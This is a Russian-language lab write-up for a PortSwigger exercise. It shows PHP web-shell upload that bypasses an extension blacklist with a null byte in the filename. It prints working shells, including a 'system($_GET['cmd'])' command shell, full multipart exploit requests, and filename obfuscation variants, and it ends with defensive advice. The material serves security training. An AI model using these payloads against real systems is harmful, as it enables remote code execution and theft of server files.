# 📘 PortSwigger Lab: Web shell upload via obfuscated file extension

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension  
> 🎯 Тема: Unrestricted File Upload — обход blacklist через null byte в имени файла  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [☠️ Null byte — расхождение уровней абстракции](#null-byte)
- [🐚 Веб-шелл](#webshell)
- [⚡ Пейлоад эксплойта](#exploit)
- [🔍 Шаг 1 — Разведка функции загрузки и пути раздачи](#step1)
- [🔍 Шаг 2 — Картирование фильтра](#step2)
- [🔍 Шаг 3 — Подготовка обходного запроса](#step3)
- [🔍 Шаг 4 — Загрузка с null byte и чтение сигнала сервера](#step4)
- [🔍 Шаг 5 — Выполнение шелла и извлечение секрета](#step5)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Обойти blacklist расширений классической обфускацией имени файла, чтобы:

```text
1. Загрузить PHP веб-шелл под маскированным расширением.
2. Выполнить шелл через GET-запрос к загруженному файлу.
3. Эксфильтровать содержимое /home/carlos/secret и отправить его как решение.
```

Учётные данные тестового пользователя:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Blacklist расширений блокирует «опасные» суффиксы. Классические техники обфускации эксплуатируют расхождения между компонентами, через которые проходит имя файла:

```text
валидация (высокоуровневая)  →  URL-декодер  →  файловая система  →  обработчик MIME
```

Каждый компонент определяет «конец имени файла» и «смысл суффикса» по-своему.

**Null byte** (`%00`) — самый системный приём: в низкоуровневых функциях C/C++ нулевой байт терминирует строку, а высокоуровневые языки (PHP/Java) видят его как обычный символ внутри строки:

```text
Валидация (PHP):   "exploit.php%00.jpg" — суффикс .jpg → разрешено
Хранение (C):      exploit.php[NULL]... → имя заканчивается на exploit.php
```

PHP закрыл этот вектор с версии 5.3.4, но в legacy-системах он жив. Лаба симулирует уязвимую конфигурацию.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Одно имя файла, два прочтения:

```text
filename="exploit.php%00.jpg"

Валидация видит:   суффикс ".jpg"      → нет ".php" → пропуск ✅
Сервер видит:      имя до null byte    → "exploit.php"  → сохраняет как PHP
```

Соответствие подтверждается ответом сервера: он называет загруженный файл `exploit.php` — null byte и `.jpg` «исчезли» на уровне хранения.

---

<a id="null-byte"></a>

## ☠️ Null byte — расхождение уровней абстракции

Почему `%00` работает:

```text
1. URL-декодер сервера превращает "%00" в байт 0x00.
2. Высокоуровневый код валидации видит строку
   "exploit.php\x00.jpg" — суффикс ".jpg", всё законно.
3. Низкоуровневая функция записи файла (C-подобная семантика)
   трактует 0x00 как конец строки → сохраняется только "exploit.php".
4. Файл с расширением .php сохранён — сервер исполняет его как PHP.
```

Это ровно тот же принцип «проверка и исполнение видят разные строки», что и в предыдущих лабах:

```text
SSRF:           фильтр декодирует %2561dmin один раз, HTTP-клиент — второй
Path traversal: sanitize видит ..%2f, файловая система — ../
Здесь:          валидация видит exploit.php%00.jpg, ФС — exploit.php
```

---

<a id="webshell"></a>

## 🐚 Веб-шелл

Минимальный PHP-шелл для чтения целевого файла:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Универсальный вариант:

```php
<?php echo system($_GET['cmd']); ?>
```

---

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

Файл для загрузки (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Ключевые модификации multipart-части:

```text
filename="exploit.php%00.jpg"          ← обфускация имени
тело части → PHP-код вместо байтов картинки   ← обязательно!
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функции загрузки и пути раздачи

1. Авторизоваться под `wiener:peter`.
2. Загрузить обычное изображение как аватар.
3. Вернуться на страницу аккаунта.
4. В Burp → Proxy → HTTP history найти запрос раздачи аватара:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

и отправить его в Repeater.

**Нюанс (из практики):** запрос картинки может не отображаться в HTTP history. Причины и решения:

```text
Фильтр MIME:        в фильтре истории включить MIME type "Images"
Кэш браузера:       обновить страницу с Ctrl+F5
Обходной путь:      Target → Site map — запрос появится там,
                    правый клик → Send to Repeater
Либо вручную:       правый клик по аватару в браузере → Copy image address,
                    собрать GET в Repeater самостоятельно
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Картирование фильтра

1. Создать локально `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Попытаться загрузить как аватар. Ответ сервера:

```text
You can only upload JPG and PNG files.
```

Картирование фильтра:

```text
Механизм:        blacklist расширений (только JPG и PNG)
Проверяется:     суффикс имени файла
Не проверяется:  содержимое файла
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Подготовка обходного запроса

В HTTP history найти `POST /my-account/avatar` и отправить в Repeater.

В multipart-части файла изменить **два элемента**:

```text
1. Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
2. Тело части полностью заменить на PHP-код
```

Итоговая часть:

```text
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

**Критичный нюанс:** если оставить тело от исходной картинки (байты JPEG), сервер сохранит бинарный JPEG под именем `exploit.php`. PHP-интерпретатор запустится, но выводить будет бинарник — секрета не будет. Замена тела обязательна.

Технические детали редактирования:

```text
После Content-Type: image/jpeg — ровно одна пустая строка, затем PHP-код.
Следующая граница boundary остаётся нетронутой.
Content-Type: image/jpeg можно не менять — сервер проверяет только расширение.
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Загрузка с null byte и чтение сигнала сервера

Отправить запрос. Ответ:

```text
The file avatars/exploit.php has been uploaded.
```

Разбор сигнала:

```text
Сервер называет файл "exploit.php"  →  %00.jpg обрезан на уровне хранения
Загрузка прошла                     →  валидация видела суффикс .jpg
```

Два компонента прочли одно имя по-разному — уязвимость подтверждена.

**Практический совет:** проверять ответ POST именно на эту фразу. Если ответ по-прежнему `You can only upload JPG and PNG files.` — null byte не сработал в этой отправке; проверить, что `%00` записан как текст из трёх символов в заголовке, а не сырой байт.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Выполнение шелла и извлечение секрета

В Repeater-вкладке с запросом раздачи аватара заменить имя файла:

```http
GET /files/avatars/exploit.php HTTP/2
```

Отправить **заново, после загрузки** — старый ответ в панели мог остаться от предыдущей отправки.

**Как отличить результат:**

```text
ÿØÿà (байты FF D8 FF E0)  → JPEG magic bytes: запрошена картинка, шелл не сработал
Читаемый текст            → PHP исполнен, секрет получен
Дата ответа обновилась    → запрос реально обработан заново
```

Ожидаемый ответ — секрет:

```text
SECRET-VALUE-HERE
```

Отправить секрет через кнопку в баннере лабы.

Лаборатория получает статус:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Примеры запросов

### Разведка: раздача аватара

```http
GET /files/avatars/avatar.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

Ответ — бинарный JPEG (начало: `FF D8 FF E0`, в Burp отображается как `ÿØÿà`), `Content-Type: text/html`, `Server: Apache/2.4.41 (Ubuntu)` — намёк, что .php будет исполнен.

### Блокированная загрузка (эталон)

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundaryhLxqR9zyleOT53Bs

------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

Ответ:

```text
You can only upload JPG and PNG files.
```

### Рабочая загрузка — null byte

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundaryhLxqR9zyleOT53Bs

------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

### Запрос к шеллу

```http
GET /files/avatars/exploit.php HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

---

<a id="response"></a>

## 📥 Пример результата

### Ответ рабочей загрузки

```text
The file avatars/exploit.php has been uploaded.
```

### Ответ шелла

```text
HTTP/2 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Статус лаборатории:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Авторизоваться под wiener:peter
2. Загрузить тестовое изображение, найти GET /files/avatars/ (history/Site map)
3. Попытаться загрузить exploit.php → блокировка (только JPG/PNG)
4. Найти POST /my-account/avatar, отправить в Repeater
5. filename="exploit.php%00.jpg" + тело части заменить на PHP-код
6. Отправить → сервер называет файл exploit.php
7. GET /files/avatars/exploit.php (отправить заново!) → секрет в ответе
8. Секрет отправлен — лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Валидация работает на высоком уровне абстракции

PHP-код валидации видит `%00` как часть строки: суффикс — `.jpg`, всё законно.

### 2. Хранение работает на низком уровне

Низкоуровневая функция записи трактует байт 0x00 как конец имени — сохраняется только `exploit.php`.

### 3. Содержимое не проверяется вообще

Фильтр смотрит только суффикс. PHP-код внутри части проходит без препятствий — сервер сохранит и исполнит его.

### 4. Расхождение парсеров = пространство обхода

Единственный источник истины — имя файла — прочтён двумя компонентами по-разному. Атакующий выбрал запись, на которой они расходятся.

### 5. Ответ сервера раскрыл механику

Сообщение `The file avatars/exploit.php has been uploaded.` прямо показало, что null byte «съеден» при хранении, — бесплатная разведка.

### 6. Сервер исполняет PHP в директории загрузок

Apache + mod_php исполняет сохранённый `.php` → RCE.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При blacklist расширений не перебирай слепо — закартируй, как сервер обрабатывает имя:

```text
1. Регистр:           exploit.pHp → блокирует ли?
2. Двойное расширение: exploit.php.jpg → какой суффикс «настоящий»?
3. Трейлинг:          exploit.php. → обрезается ли хвост?
4. URL-кодирование:   exploit%2Ephp → декодирует ли после валидации?
5. Null byte:         exploit.php%00.jpg → что называет сервер в ответе?
```

Сигналы для чтения:

```text
Сообщение загрузки   → какое имя сервер считает финальным
Реакция на %00       → есть ли низкоуровневая обработка имени
Content-Type ответа  → text/html для картинки намекает на «отдачу как есть»
```

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках лаборатории можно сравнить:

### Универсальный шелл

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.php?cmd=whoami
```

### Другие формы null byte

```text
filename="exploit.php%00.png"     → PNG вместо JPG
```

### Картирование валидации

```text
exploit.pHp          → блокирует ли регистр?
exploit.php.jpg      → какой суффикс проверяется?
exploit%2Ephp        → декодирует ли после валидации?
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Оставить тело картинки в multipart-части

Самая частая ошибка в этой лабе: заменили только `filename`, а байты JPEG остались. Сервер сохранит бинарный JPEG как `exploit.php`, PHP-интерпретатор выведет бинарник — секрета не будет. Тело части нужно **полностью заменить** на PHP-код.

### Ошибка 2. Не URL-кодировать null byte

В имени файла `%00` должен передаваться как текст из трёх символов (`%`, `0`, `0`), чтобы сервер сам декодировал его в байт 0x00. Сырой байт в заголовке может сломать парсинг multipart.

### Ошибка 3. Считать, что null byte «не сработал», если не прочитать ответ

Ответ `The file avatars/exploit.php has been uploaded.` — прямое доказательство успеха. Файл сохранён как PHP, даже если в браузере имя выглядело иначе.

### Ошибка 4. Запрашивать файл по имени с %00

После загрузки файл на сервере называется `exploit.php` — запрашивать нужно:

```text
GET /files/avatars/exploit.php
```

а не `GET /files/avatars/exploit.php%00.jpg`.

### Ошибка 5. Не переотправить GET после загрузки

Панель ответа в Repeater показывает последний результат. Если отправить GET до загрузки (или прочитать старый ответ), увидишь `ÿØÿà` и одинаковую дату с предыдущим ответом. Признак старого ответа: **идентичная дата `Date:` в заголовке**. После загрузки отправить GET заново.

### Ошибка 6. Не проверить блокировку простого .php сначала

Без эталона (`exploit.php` → блок) нельзя понять, что фильтр вообще есть и что обход сработал.

### Ошибка 7. Ожидать, что %00 сработает в современных PHP

PHP ≥ 5.3.4 отклоняет имена с null byte. Лаба симулирует legacy-поведение; в реальных системах вектор применим только к старым стекам.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не использовать filename для построения пути

Генерировать имя на сервере (UUID) — тогда обфускация имени не имеет смысла.

### 2. Отклонять имена с управляющими байтами

Проверять, что имя содержит только безопасные символы:

```text
[a-zA-Z0-9._-]
```

Любые `%00`, управляющие байты и спецсимволы → отклонение загрузки.

### 3. Whitelist расширений

Разрешать только `jpg`, `jpeg`, `png`, `webp` после **нормализации имени** (декодирование, приведение регистра).

### 4. Валидировать содержимое

Magic bytes + переобработка изображений — независимо от имени.

### 5. Современные языки и версии

Актуальные PHP (≥ 5.3.4) и Java-стеки отклоняют null byte в путях — держать зависимости обновлёнными.

### 6. Хранение вне веб-корня и запрет исполнения

Убрать саму возможность исполнения загруженных файлов.

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Авторизован под wiener:peter
- [ ] Загружено тестовое изображение
- [ ] Найден `GET /files/avatars/<image>` (history / Site map / Copy image address)
- [ ] GET-запрос отправлен в Repeater

### Картирование фильтра

- [ ] Загрузка `exploit.php` заблокирована (только JPG/PNG)
- [ ] POST-запрос отправлен в Repeater

### Эксплуатация

- [ ] filename изменён на `exploit.php%00.jpg`
- [ ] Тело multipart-части заменено на PHP-код (не байты картинки!)
- [ ] Загрузка прошла, сервер называет файл `exploit.php`
- [ ] `GET /files/avatars/exploit.php` отправлен заново после загрузки
- [ ] В ответе секрет, а не JPEG magic bytes (`ÿØÿà`)
- [ ] Секрет отправлен
- [ ] Статус лабы: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **null byte в имени файла**:

```text
1. Валидация видит "exploit.php%00.jpg" → суффикс .jpg → пропуск
2. Низкоуровневое хранение трактует 0x00 как конец имени → exploit.php
3. Файл сохранён как PHP и исполняется сервером
4. Секрет прочитан
```

Главные выводы:

```text
Обфускация работает, когда проверка и исполнение видят имя файла по-разному.
```

```text
Null byte — расхождение уровней абстракции: C-семантика строк vs высокоуровневые языки.
```

```text
Имя и содержимое — два независимых вектора: оба должны быть под контролем атакующего.
```

```text
Ответ сервера, называющий итоговое имя файла, — бесплатная разведка механики обработки.
```

```text
Защита: серверные имена файлов, whitelist после нормализации, отклонение управляющих байтов.
```

---

[⬆ Вернуться к началу](#top)
